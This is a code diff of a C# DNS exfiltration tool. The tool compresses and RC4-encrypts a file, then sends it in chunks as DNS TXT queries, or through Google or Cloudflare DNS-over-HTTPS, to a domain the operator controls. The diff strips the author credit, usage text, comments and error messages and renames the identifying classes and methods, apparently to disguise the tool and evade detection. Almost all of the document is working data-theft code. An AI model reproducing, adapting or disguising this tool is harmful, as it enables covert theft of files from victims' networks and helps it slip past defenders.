@@ -1,14 +1,3 @@
-/*
-Author: Arno0x0x, Twitter: @Arno0x0x
-
-How to compile:
-===============
-As a standalone executable:
-	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /reference:System.IO.Compression.dll /out:dnsExfiltrator.exe dnsExfiltrator.cs
-	
-As a DLL:
-	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /target:library /reference:System.IO.Compression.dll /out:dnsExfiltrator.dll dnsExfiltrator.cs
-*/
 using System;
 using System.Net;
 using System.Web.Script.Serialization;
@@ -22,43 +11,23 @@ using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Threading;
 	
-namespace DNSExfiltrator
+namespace DNSExfil
 {
-	//============================================================================================
-	// This class performs the actual data exfiltration using DNS requests covert channel
-	//============================================================================================
+	
 	[ComVisible(true)]
-	public class DNSExfiltrator
+	public class DNSExfil
 	{	
-		//------------------------------------------------------------------------------------
-        // Constructors for the the DNSExfiltrator class
-        //------------------------------------------------------------------------------------
-		public DNSExfiltrator()
+		
+		public DNSExfil()
         {
         }
 		
-		//------------------------------------------------------------------------------------
-		// Print usage
-		//------------------------------------------------------------------------------------
 		private static void PrintUsage()
 		{
-			Console.WriteLine("Usage:");
-			Console.WriteLine("{0} <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]", System.AppDomain.CurrentDomain.FriendlyName);
-			Console.WriteLine("\tfile:\t\t[MANDATORY] The file name to the file to be exfiltrated.");
-			Console.WriteLine("\tdomainName:\t[MANDATORY] The domain name to use for DNS requests.");
-			Console.WriteLine("\tpassword:\t[MANDATORY] Password used to encrypt the data to be exfiltrated.");
-			Console.WriteLine("\t-b32:\t\t[OPTIONNAL] Use base32 encoding of data. Might be required by some DNS resolver which break case.");
-			Console.WriteLine("\th:\t\t[OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.");
-			Console.WriteLine("\tDNS_Server:\t[OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.");
-			Console.WriteLine("\tthrottleTime:\t[OPTIONNAL] The time in milliseconds to wait between each DNS request.");
-			Console.WriteLine("\trequestMaxSize:\t[OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes.");
-			Console.WriteLine("\tlabelMaxSize:\t[OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.");
+
 		}
 		
-		//------------------------------------------------------------------------------------
-		// Outputs to console with color
-		//------------------------------------------------------------------------------------
-		private static void PrintColor(string text)
+		public static void PrintColor(string text)
 		{
 			if (text.StartsWith("[!]")) { Console.ForegroundColor = ConsoleColor.Red;}
 			else if (text.StartsWith("[+]")) { Console.ForegroundColor = ConsoleColor.Green;}
@@ -70,57 +39,29 @@ namespace DNSExfiltrator
 			Console.ForegroundColor = ConsoleColor.White;
 		}
 		
-		//------------------------------------------------------------------------------------
-		// Encodes a byte array of data into a base64url string
-		//------------------------------------------------------------------------------------
+
 		private static string ToBase64URL(byte[] data)
 		{
 			string result = String.Empty;
 			
-			// characters used in DNS names through the Win32 API resolution library do not
-			// support all of the base64 characters. We have to use the base64url standard:
-			// '/' and '+' characters are substituded
-			// '=' padding character are removed and will need to be recomputed at the remote end
 			result = Convert.ToBase64String(data).Replace("=","").Replace("/","_").Replace("+","-");
 			return result;
 		}
 		
-		//------------------------------------------------------------------------------------
-		// Encodes a byte array of data into a base32 string
-		//------------------------------------------------------------------------------------
+	
 		private static string ToBase32(byte[] data)
 		{
 			string result = String.Empty;
 			
-			// characters used in DNS names through the Win32 API resolution library do not
-			// support all of the base64 characters. We have to use the base64url standard:
-			// '/' and '+' characters are substituded
-			// '=' padding character are removed and will need to be recomputed at the remote end
 			result = Base32.ToBase32String(data).Replace("=","");
 			return result;
 		}
 		
-		//------------------------------------------------------------------------------------
-		// Required entry point signature for DotNetToJScript
-		// Convert the dnsExfiltrator DLL to a JScript file using this command:
-		// c:\> DotNetToJScript.exe -v Auto -l JScript -c DNSExfiltrator.DNSExfiltrator -o dnsExfiltrator.js dnsExfiltrator.dll
-		//
-		// Then add the following section of code in the generated dnsExfiltrator.js, just after the object creation:
-		//		var args = "";
-		//		for (var i = 0; i < WScript.Arguments.length-1; i++) {
-		//			args += WScript.Arguments(i) + "|";
-		//		}
-		//		args += WScript.Arguments(i);
-		//		o.GoFight(args);
-		//------------------------------------------------------------------------------------
 		public void GoFight(string args)
 		{
 			Main(args.Split('|'));
 		}
 		
-		//------------------------------------------------------------------------------------
-		// MAIN FUNCTION
-		//------------------------------------------------------------------------------------
         public static void Main(string[] args)
         {
 			// Mandatory parameters
@@ -219,7 +160,6 @@ namespace DNSExfiltrator
 				zipStream.Seek(0, SeekOrigin.Begin);
 				PrintColor(String.Format("[*] Encrypting the ZIP file with password [{0}]",password));
 				
-				// Should we use base32 encoding ? CloudFlare requires it because of Knot server doing case randomization which breaks base64
 				if (useBase32) {
 					PrintColor("[*] Encoding the data with Base32");
 					data = ToBase32(RC4Encrypt.Encrypt(Encoding.UTF8.GetBytes(password),zipStream.ToArray()));
@@ -232,12 +172,6 @@ namespace DNSExfiltrator
 				PrintColor(String.Format("[*] Total size of data to be transmitted: [{0}] bytes", data.Length));
 			}
 			
-			//--------------------------------------------------------------
-			// Compute the size of the chunk and how it can be split into subdomains (labels)
-			// https://blogs.msdn.microsoft.com/oldnewthing/20120412-00/?p=7873
-
-			// The bytes available to exfiltrate actual data, keeping 10 bytes to transmit the chunk number:
-			// <chunk_number>.<data>.<data>.<data>.domainName.
 			int bytesLeft = requestMaxSize - 10 - (domainName.Length+2); // domain name space usage in bytes
 			
 			int nbFullLabels = bytesLeft/(labelMaxSize+1);
@@ -256,26 +190,22 @@ namespace DNSExfiltrator
 				request = "init." + ToBase32(Encoding.UTF8.GetBytes(String.Format("{0}|{1}",fileName, nbChunks))) + ".base64." + domainName;
 			}
 			
-			PrintColor("[*] Sending 'init' request");
+			PrintColor("[*] Sending...");
 
 			string reply = String.Empty;
 			try {
-				if (useDoH) { reply = DOHResolver.GetTXTRecord(dohProvider, request); }
-				else { reply = DnsResolver.GetTXTRecord(request,dnsServer); }
+				reply = Resolver.GetRecord(request,dnsServer);
 				
 				if (reply != "OK") {
-					PrintColor(String.Format("[!] Unexpected answer for an initialization request: [{0}]", reply[0]));
 					return;
 				}
 			}
 			catch (Win32Exception e) {
-				PrintColor(String.Format("[!] Unexpected exception occured: [{0}]",e.Message));
+
 				return;
 			}
-			
-			//--------------------------------------------------------------
-			// Send all chunks of data, one by one
-			PrintColor("[*] Sending data...");
+
+			PrintColor("[*] Sending more");
 			
 			string chunk = String.Empty;
 			int chunkIndex = 0;
@@ -301,8 +231,8 @@ namespace DNSExfiltrator
 				
 				// Send the request
 				try {
-					if (useDoH) { reply = DOHResolver.GetTXTRecord(dohProvider, request); }
-					else { reply = DnsResolver.GetTXTRecord(request,dnsServer); }
+					if (useDoH) { reply = DOHResolver.GetRecord(dohProvider, request); }
+					else { reply = Resolver.GetRecord(request,dnsServer); }
 					
 					countACK = Convert.ToInt32(reply);
 					
@@ -329,11 +259,7 @@ namespace DNSExfiltrator
 		} // End Main
 		
 	}
-	
-	//============================================================================================
-	// This class provides RC4 encryption functions
-	// https://bitlush.com/blog/rc4-encryption-in-c-sharp
-	//============================================================================================
+
 	public class RC4Encrypt
 	{
 		public static byte[] Encrypt(byte[] key, byte[] data)
@@ -379,9 +305,6 @@ namespace DNSExfiltrator
 		}
 	}	
 
-	//============================================================================================
-	// Define all classes required to deserialize CloudFlare or Google JSON response into an object
-	//============================================================================================
 	public class Question
 	{
 		public string name { get; set; }
@@ -406,16 +329,13 @@ namespace DNSExfiltrator
 		public List<Answer> Answer { get; set; }
 	}
 	
-	//============================================================================================
-	// This class provides DNS over HTTP resolution using the Google DOH experimental servers
-	//============================================================================================
     public class DOHResolver
     {
 		
 		static string googleDOHURI = " https://dns.google.com/resolve?name="; // https://developers.google.com/speed/public-dns/docs/dns-over-https
 		static string cloudflareDOHURI = "https://cloudflare-dns.com/dns-query?ct=application/dns-json&name="; // https://developers.cloudflare.com/1.1.1.1/dns-over-https/wireformat/
 		
-		public static string GetTXTRecord(string dohProvider, string domain)
+		public static string GetRecord(string dohProvider, string domain)
 		{
 			string dohQuery = String.Empty;
 			
@@ -450,110 +370,20 @@ namespace DNSExfiltrator
 				throw new Win32Exception("DNS answer does not contain a TXT resource record.");
 			}
 			
-			/*========================================== OLD CODE USING UDPWIRE FORMAT - Seems deprecated at Google, still available at CloudFlare ================================
-			List<byte> dnsPacket = new List<byte>();
-			List<byte> dnsQuery = new List<byte>();
-			
-	
-			//---- Crafting the DNS packet, starting with the headers
-			// Transaction ID = 0x00002
-			// Flags: standard query = 0x0100
-			// Questions: 1 question = 0x0001
-			// Answer RRs: 0 = 0x0000
-			// Authority RRs: 0 = 0x0000
-			// Additional RRs: 0 = 0x0000
-			dnsPacket.AddRange(new byte[]{0x00, 0x02, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}); 
-						
-			foreach (string label in domain.Split('.')) {
-				dnsQuery.Add(Convert.ToByte(label.Length)); // Label size
-				dnsQuery.AddRange(Encoding.UTF8.GetBytes(label)); // Label
-			}
-			dnsQuery.Add(0x00); // Terminating labels
-			
-			// QType: TXT = 0x0010
-			// QClass: In (internet) = 0x0001
-			dnsQuery.AddRange(new byte[]{0x00, 0x10, 0x00, 0x01});
-			
-			//---- Concatenate the headers and the Query
-			dnsPacket.AddRange(dnsQuery);
-						
-			// Converting the dnsWirePacket to a base64url representation
-			string dohParameter = Convert.ToBase64String(dnsPacket.ToArray()).Replace("=","").Replace("/","_").Replace("+","-");
-			
-			if (dohProvider.Equals("google")) {
-				dohQuery = googleDOHURI + dohParameter;
-			}
-			else if (dohProvider.Equals("cloudflare")) {
-				dohQuery = cloudflareDOHURI + dohParameter;
-			}
-			
-			//------------------------------------------------------------------
-			// Perform the DOH request to the server
-			WebClient webClient = new WebClient(); // WebClient object to communicate with the DOH server
-			
-						
-            //---- Check if an HTTP proxy is configured on the system, if so, use it
-            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
-            if (defaultProxy != null)
-            {
-                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
-                webClient.Proxy = defaultProxy;
-            }
-			
-			//---- Sending the DOH request and receiving the answer in a byte array
-			byte[] responsePacket = null;
-			responsePacket = webClient.DownloadData(dohQuery);
-			
-			// DEBUG SECTION
-			// Console.WriteLine("Response received:");
-			// int i = 0;
-			// foreach (byte b in responsePacket) {
-			// 	Console.WriteLine("Packet[{0}]: {1} --> {2}",i++,Convert.ToInt32(b), Convert.ToChar(b));
-			// }
-									
-			// DNS response structure is made of: [Headers] + [DNS Query] + [DNS Answer]
-			// Check we have at least one Answer Resource Records --> RR field
-			if (Convert.ToInt32(responsePacket[7]) > 0) {
-				int answerIndex = 12 + dnsQuery.Count; // Header size + Query size -1 to get the index of the array element
-				
-				// Check the type of answer is TXT
-				if (Convert.ToInt32(responsePacket[answerIndex + 3]) == 0x10) {
-					int txtLength = Convert.ToInt32(responsePacket[answerIndex + 12]);
-					
-					byte[] txtRecord = new byte[txtLength];
-					Array.Copy(responsePacket,answerIndex + 13, txtRecord, 0, txtLength);
-					
-					return Encoding.UTF8.GetString(txtRecord);
-				}
-				else {
-					throw new Win32Exception("DNS answer does not contain a TXT resource record.");
-				}
-			}
-			else {
-				throw new Win32Exception("DNS answer does not contain any resource record.");
-			}
-			*/
 		}
 	}
-	
-	//============================================================================================
-	// This class provides DNS resolution by using the PInvoke calls to the native Win32 API
-	//============================================================================================
-    public class DnsResolver
+
+    public class Resolver
     {       
-		//---------------------------------------------------------------------------------
-		// Import WIN32 API extern function
-		//---------------------------------------------------------------------------------
+		
         [DllImport("dnsapi", EntryPoint="DnsQuery_W", CharSet=CharSet.Unicode, SetLastError=true, ExactSpelling=true)]
         private static extern int DnsQuery([MarshalAs(UnmanagedType.VBByRefStr)]ref string pszName, DnsRecordTypes wType, DnsQueryOptions options, ref IP4_ARRAY dnsServerIpArray, ref IntPtr ppQueryResults, int pReserved);
 
         [DllImport("dnsapi", CharSet=CharSet.Auto, SetLastError=true)]
         private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);
 		
-		//---------------------------------------------------------------------------------
-		// Resolving TXT records only (for now)
-		//---------------------------------------------------------------------------------
-        public static string GetTXTRecord(string domain, string serverIP = null)
+		
+        public static string GetRecord(string domain, string serverIP = null)
         {
 			IntPtr recordsArray = IntPtr.Zero;
 			IntPtr dnsRecord = IntPtr.Zero;
@@ -569,7 +399,6 @@ namespace DNSExfiltrator
 				dnsServerArray.AddrArray[0] = address;
 			}
            
-			// Interop calls will only work on Windows platform (no mono c#)
 			if (Environment.OSVersion.Platform != PlatformID.Win32NT)
             {
                 throw new NotSupportedException();
@@ -578,21 +407,19 @@ namespace DNSExfiltrator
 			ArrayList recordList = new ArrayList();
 			try
 			{
-				int queryResult = DnsResolver.DnsQuery(ref domain, DnsRecordTypes.DNS_TYPE_TXT, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, ref dnsServerArray, ref recordsArray, 0);
+				int queryResult = Resolver.DnsQuery(ref domain, DnsRecordTypes.DNS_TYPE_TXT, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, ref dnsServerArray, ref recordsArray, 0);
 				
-				// Check for error
+
 				if (queryResult != 0)
 				{
 					throw new Win32Exception(queryResult);
 				}
 				
-				// Loop through the result record list
 				for (dnsRecord = recordsArray; !dnsRecord.Equals(IntPtr.Zero); dnsRecord = txtRecord.pNext)
 				{
 					txtRecord = (TXTRecord) Marshal.PtrToStructure(dnsRecord, typeof(TXTRecord));
 					if (txtRecord.wType == (int)DnsRecordTypes.DNS_TYPE_TXT)
 					{
-						//Console.WriteLine("Size of array: {0}",txtRecord.dwStringCount);
 						string txt = Marshal.PtrToStringAuto(txtRecord.pStringArray);
 						recordList.Add(txt);
 					}
@@ -600,19 +427,13 @@ namespace DNSExfiltrator
 			}
 			finally
 			{
-				DnsResolver.DnsRecordListFree(recordsArray, 0);
+				Resolver.DnsRecordListFree(recordsArray, 0);
 			}
 			
 			// Return only the first TXT answer
 			return (string)recordList[0];
 		}
 
-		//---------------------------------------------------------------------------------
-		// WIN32 DNS STRUCTURES
-		//---------------------------------------------------------------------------------
-		/// <summary>
-		/// See https://msdn.microsoft.com/en-us/library/windows/desktop/ms682139(v=vs.85).aspx
-		/// </summary>
 		public struct IP4_ARRAY
 		{
 			/// DWORD->unsigned int
@@ -639,9 +460,6 @@ namespace DNSExfiltrator
             
         }
 		
-		/// <summary>
-		/// See http://msdn.microsoft.com/en-us/library/windows/desktop/cc982162(v=vs.85).aspx
-		/// </summary>
 		[Flags]
 		private enum DnsQueryOptions
 		{
@@ -669,10 +487,7 @@ namespace DNSExfiltrator
 			DNS_QUERY_RESERVED = unchecked((int)0xF0000000)
 		}
 
-		/// <summary>
-		/// See http://msdn.microsoft.com/en-us/library/windows/desktop/cc982162(v=vs.85).aspx
-		/// Also see http://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml
-		/// </summary>
+
 		private enum DnsRecordTypes
 		{
 			DNS_TYPE_A = 0x1,
@@ -741,111 +556,73 @@ namespace DNSExfiltrator
 		}
     }
 	
-	//============================================================================================
-	// This class provides Base32 encoding
-	// http://scottless.com/blog/archive/2014/02/15/base32-encoder-and-decoder-in-c.aspx
-	//============================================================================================
 	internal sealed class Base32
     {
-        /// <summary>
-        /// Size of the regular byte in bits
-        /// </summary>
+
         private const int InByteSize = 8;
 
-        /// <summary>
-        /// Size of converted byte in bits
-        /// </summary>
         private const int OutByteSize = 5;
 
-        /// <summary>
-        /// Alphabet
-        /// </summary>
         private const string Base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
 
-        /// <summary>
-        /// Convert byte array to Base32 format
-        /// </summary>
-        /// <param name="bytes">An array of bytes to convert to Base32 format</param>
-        /// <returns>Returns a string representing byte array</returns>
         internal static string ToBase32String(byte[] bytes)
         {
-            // Check if byte array is null
+
             if (bytes == null)
             {
                 return null;
             }
-            // Check if empty
+
             else if (bytes.Length == 0)
             {
                 return string.Empty;
             }
 
-            // Prepare container for the final value
             StringBuilder builder = new StringBuilder(bytes.Length * InByteSize / OutByteSize);
 
-            // Position in the input buffer
             int bytesPosition = 0;
 
-            // Offset inside a single byte that <bytesPosition> points to (from left to right)
-            // 0 - highest bit, 7 - lowest bit
             int bytesSubPosition = 0;
 
-            // Byte to look up in the dictionary
             byte outputBase32Byte = 0;
 
-            // The number of bits filled in the current output byte
             int outputBase32BytePosition = 0;
 
-            // Iterate through input buffer until we reach past the end of it
             while (bytesPosition < bytes.Length)
             {
-                // Calculate the number of bits we can extract out of current input byte to fill missing bits in the output byte
+
                 int bitsAvailableInByte = Math.Min(InByteSize - bytesSubPosition, OutByteSize - outputBase32BytePosition);
 
-                // Make space in the output byte
                 outputBase32Byte <<= bitsAvailableInByte;
 
-                // Extract the part of the input byte and move it to the output byte
                 outputBase32Byte |= (byte)(bytes[bytesPosition] >> (InByteSize - (bytesSubPosition + bitsAvailableInByte)));
 
-                // Update current sub-byte position
                 bytesSubPosition += bitsAvailableInByte;
 
-                // Check overflow
                 if (bytesSubPosition >= InByteSize)
                 {
-                    // Move to the next byte
                     bytesPosition++;
                     bytesSubPosition = 0;
                 }
 
-                // Update current base32 byte completion
                 outputBase32BytePosition += bitsAvailableInByte;
 
-                // Check overflow or end of input array
                 if (outputBase32BytePosition >= OutByteSize)
                 {
-                    // Drop the overflow bits
-                    outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary
+                    outputBase32Byte &= 0x1F;  
 
-                    // Add current Base32 byte and convert it to character
                     builder.Append(Base32Alphabet[outputBase32Byte]);
 
-                    // Move to the next byte
                     outputBase32BytePosition = 0;
                 }
             }
 
-            // Check if we have a remainder
             if (outputBase32BytePosition > 0)
             {
-                // Move to the right bits
                 outputBase32Byte <<= (OutByteSize - outputBase32BytePosition);
 
-                // Drop the overflow bits
-                outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary
+                outputBase32Byte &= 0x1F;
 
-                // Add current Base32 byte and convert it to character
                 builder.Append(Base32Alphabet[outputBase32Byte]);
             }
 
